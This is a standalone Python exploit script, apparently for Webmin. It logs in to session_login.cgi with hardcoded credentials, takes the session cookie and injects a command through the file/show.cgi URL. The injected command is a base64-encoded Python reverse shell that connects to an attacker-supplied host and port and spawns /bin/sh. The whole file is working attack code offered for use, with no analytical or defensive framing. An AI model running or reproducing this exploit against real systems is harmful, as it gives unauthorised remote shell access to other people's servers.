#!/usr/bin/env python
import requests, string, secrets, sys, socket, subprocess, base64

lhost = sys.argv[1] # my IP
targetIP = sys.argv[2] # vuln IP
lport = sys.argv[3] # listing port

data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"} # Login data
url = f"http://{targetIP}/session_login.cgi" # Login page
# First Verify have Vuln
r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False) # post Login
# if Login Success print "Success",else print "Failed"
if r.status_code == 302 and r.cookies["sid"] != None:
    print("Sussess!!")
else:
    print("Failed!!")
# set cookie "sid" token
sid = r.cookies["sid"]
# generate 5 random Error char
def rand():
    Num = string.ascii_letters + string.digits
    randChar = ''.join(secrets.choice(Num) for i in range(5))
    return randChar
# Reverse shell payload
def payload():
    payload = "python -c \"import base64;exec(base64.b64decode('"
    shell = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ lhost + "\"," + lport + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"
    shell = str.encode(shell)
    encoded = base64.b64encode(shell)
    encoded = encoded.decode("utf-8")
    closing = "'))\""
    payload += encoded
    payload += closing
    return payload
# Exploit URL
exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"
# Exploit Requests and Done!!
req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)
content = req.content
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, int(lport)))
s.sendall(content)
data = s.recv(4096)
s.close()